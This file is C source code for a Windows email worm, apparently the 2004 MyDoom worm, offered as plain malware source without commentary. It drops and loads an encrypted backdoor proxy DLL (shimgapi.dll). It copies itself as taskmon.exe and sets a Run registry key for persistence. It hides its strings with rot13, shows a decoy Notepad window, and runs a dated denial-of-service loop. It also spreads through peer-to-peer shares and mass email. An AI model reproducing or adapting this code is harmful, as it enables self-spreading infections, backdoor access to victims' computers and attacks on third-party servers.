#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include "lib.h"
#include "massmail.h"
#include "scan.h"
#include "sco.h"

#include "xproxy/xproxy.inc"

const char szWhoami[] = "(sync.c,v 0.1 2004/01/xx xx:xx:xx andy)";

/* p2p.c */
void p2p_spread(void);

struct sync_t {
	int first_run;
	DWORD start_tick;
	char xproxy_path[MAX_PATH];
	int xproxy_state;              /* 0=unknown, 1=installed, 2=loaded */
	char sync_instpath[MAX_PATH];
	SYSTEMTIME sco_date;
	SYSTEMTIME termdate;
};

void decrypt1_to_file(const unsigned char *src, int src_size, HANDLE hDest)
{
	unsigned char k, buf[1024];
	int i, buf_i;
	DWORD dw;
	for (i=0,buf_i=0,k=0xC7; i<src_size; i++) {
		if (buf_i >= sizeof(buf)) {
			WriteFile(hDest, buf, buf_i, &dw, NULL);
			buf_i = 0;
		}
		buf[buf_i++] = src[i] ^ k;
		k = (k + 3 * (i % 133)) & 0xFF;
	}
	if (buf_i) WriteFile(hDest, buf, buf_i, &dw, NULL);
}

void payload_xproxy(struct sync_t *sync)
{
	char fname[20], fpath[MAX_PATH+20];
	HANDLE hFile;
	int i;
	rot13(fname, "fuvztncv.qyy");   /* "shimgapi.dll" */
	sync->xproxy_state = 0;
	for (i=0; i<2; i++) {
		if (i == 0)
			GetSystemDirectory(fpath, sizeof(fpath));
		else
			GetTempPath(sizeof(fpath), fpath);
		if (fpath[0] == 0) continue;
		if (fpath[lstrlen(fpath)-1] != '\\') lstrcat(fpath, "\\");
		lstrcat(fpath, fname);
		hFile = CreateFile(fpath, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
			NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
			if (GetFileAttributes(fpath) == INVALID_FILE_ATTRIBUTES)
				continue;
			sync->xproxy_state = 2;
			lstrcpy(sync->xproxy_path, fpath);
			break;
		}
		decrypt1_to_file(xproxy_data, sizeof(xproxy_data), hFile);
		CloseHandle(hFile);
		sync->xproxy_state = 1;
		lstrcpy(sync->xproxy_path, fpath);
		break;
	}

	if (sync->xproxy_state == 1) {
		LoadLibrary(sync->xproxy_path);
		sync->xproxy_state = 2;
	}
}

void sync_check_frun(struct sync_t *sync)
{
	HKEY k;
	DWORD disp;
	char i, tmp[128];

	/* "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\Version" */
	rot13(tmp, "Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Rkcybere\\PbzQyt32\\Irefvba");

	sync->first_run = 0;
	for (i=0; i<2; i++)
		if (RegOpenKeyEx((i == 0) ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER,
		    tmp, 0, KEY_READ, &k) == 0) {
			RegCloseKey(k);
			return;
		}

	sync->first_run = 1;
	for (i=0; i<2; i++)
		if (RegCreateKeyEx((i == 0) ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER,
		    tmp, 0, NULL, 0, KEY_WRITE, NULL, &k, &disp) == 0)
			RegCloseKey(k);
}

int sync_mutex(struct sync_t *sync)
{
	char tmp[64];
	rot13(tmp, "FjroFvcpFzgkF0");		/* "SwebSipcSmtxS0" */
	CreateMutex(NULL, TRUE, tmp);
	return (GetLastError() == ERROR_ALREADY_EXISTS) ? 1 : 0;
}

void sync_install(struct sync_t *sync)
{
	char fname[20], fpath[MAX_PATH+20], selfpath[MAX_PATH];
	HANDLE hFile;
	int i;
	rot13(fname, "gnfxzba.rkr");       /* "taskmon.exe" */

	GetModuleFileName(NULL, selfpath, MAX_PATH);
	lstrcpy(sync->sync_instpath, selfpath);
	for (i=0; i<2; i++) {
		if (i == 0)
			GetSystemDirectory(fpath, sizeof(fpath));
		else
			GetTempPath(sizeof(fpath), fpath);
		if (fpath[0] == 0) continue;
		if (fpath[lstrlen(fpath)-1] != '\\') lstrcat(fpath, "\\");
		lstrcat(fpath, fname);
		SetFileAttributes(fpath, FILE_ATTRIBUTE_ARCHIVE);
		hFile = CreateFile(fpath, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
			NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
			if (GetFileAttributes(fpath) == INVALID_FILE_ATTRIBUTES)
				continue;
			lstrcpy(sync->sync_instpath, fpath);
			break;
		}
		CloseHandle(hFile);
		DeleteFile(fpath);

		if (CopyFile(selfpath, fpath, FALSE) == 0) continue;
		lstrcpy(sync->sync_instpath, fpath);
		break;
	}
}

void sync_startup(struct sync_t *sync)
{
	HKEY k;
	char regpath[128];
	char valname[32];

	/* "Software\\Microsoft\\Windows\\CurrentVersion\\Run" */
	rot13(regpath, "Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha");
	rot13(valname, "GnfxZba");	/* "TaskMon" */

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, regpath, 0, KEY_WRITE, &k) != 0)
		if (RegOpenKeyEx(HKEY_CURRENT_USER, regpath, 0, KEY_WRITE, &k) != 0)
			return;
	RegSetValueEx(k, valname, 0, REG_SZ, sync->sync_instpath, lstrlen(sync->sync_instpath)+1);
	RegCloseKey(k);
}

int sync_checktime(struct sync_t *sync)
{
	FILETIME ft_cur, ft_final;
	GetSystemTimeAsFileTime(&ft_cur);
	SystemTimeToFileTime(&sync->termdate, &ft_final);
	if (ft_cur.dwHighDateTime > ft_final.dwHighDateTime) return 1;
	if (ft_cur.dwHighDateTime < ft_final.dwHighDateTime) return 0;
	if (ft_cur.dwLowDateTime > ft_final.dwLowDateTime) return 1;
	return 0;
}

void payload_sco(struct sync_t *sync)
{
	FILETIME ft_cur, ft_final;

/* What's the bug about "75% failures"? */

	GetSystemTimeAsFileTime(&ft_cur);
	SystemTimeToFileTime(&sync->sco_date, &ft_final);
	if (ft_cur.dwHighDateTime < ft_final.dwHighDateTime) return;
	if (ft_cur.dwLowDateTime < ft_final.dwLowDateTime) return;


/* here is another bug.
   actually, the idea was to create a new thread and return; */

	for (;;) {
		scodos_main();
		Sleep(1024);
	}
}

DWORD _stdcall sync_visual_th(LPVOID pv)
{
	PROCESS_INFORMATION pi; 
	STARTUPINFO si; 
	char cmd[256], tmp[MAX_PATH], buf[512];
	HANDLE hFile;
	int i, j;
	DWORD dw;

	tmp[0] = 0;
	GetTempPath(MAX_PATH, tmp);
	if (tmp[0] == 0) goto ex;
	if (tmp[lstrlen(tmp)-1] != '\\') lstrcat(tmp, "\\");
	lstrcat(tmp, "Message");

	hFile = CreateFile(tmp, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) goto ex;
	for (i=0, j=0; i < 4096; i++) {
		if (j >= (sizeof(buf)-4)) {
			WriteFile(hFile, buf, sizeof(buf), &dw, NULL);
			j = 0;
		}
		if ((xrand16() % 76) == 0) {
			buf[j++] = 13;
			buf[j++] = 10;
		} else {
			buf[j++] = (16 + (xrand16() % 239)) & 0xFF;
		}
	}
	if (j) WriteFile(hFile, buf, j, &dw, NULL);
	CloseHandle(hFile);

	wsprintf(cmd, "notepad %s", tmp);
	memset(&si, '\0', sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	if (CreateProcess(0, cmd, 0, 0, TRUE, 0, 0, 0, &si, &pi) == 0)
		goto ex;
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);

ex:	if (tmp[0]) DeleteFile(tmp);
	ExitThread(0);
	return 0;
}

void sync_main(struct sync_t *sync)
{
	DWORD tid;

	sync->start_tick = GetTickCount();
	sync_check_frun(sync);
	if (!sync->first_run)
		if (sync_mutex(sync)) return;
	if (sync->first_run)
		CreateThread(0, 0, sync_visual_th, NULL, 0, &tid);
	payload_xproxy(sync);

	if (sync_checktime(sync)) return;

	sync_install(sync);
	sync_startup(sync);

	payload_sco(sync);

	p2p_spread();

	massmail_init();
	CreateThread(0, 0, massmail_main_th, NULL, 0, &tid);

	scan_init();
	for (;;) {
		scan_main();
		Sleep(1024);
	}
}

/* shit, MSVC inlined it to WinMain... I didn't expect. */
static void wsa_init(void)
{
	WSADATA wsadata;	/* useless shit... */
	WSAStartup(MAKEWORD(2,0), &wsadata);
}

int _stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmd, int nCmdShow)
{
	static const SYSTEMTIME termdate = { 2004,2,0,12,   2,28,57 };
	static const SYSTEMTIME sco_date = { 2004,2,0, 1,  16, 9,18 };
	struct sync_t sync0;

	xrand_init();
	wsa_init();

	memset(&sync0, '\0', sizeof(sync0));
	sync0.termdate = termdate;
	sync0.sco_date = sco_date;
	sync_main(&sync0);

	ExitProcess(0);
}
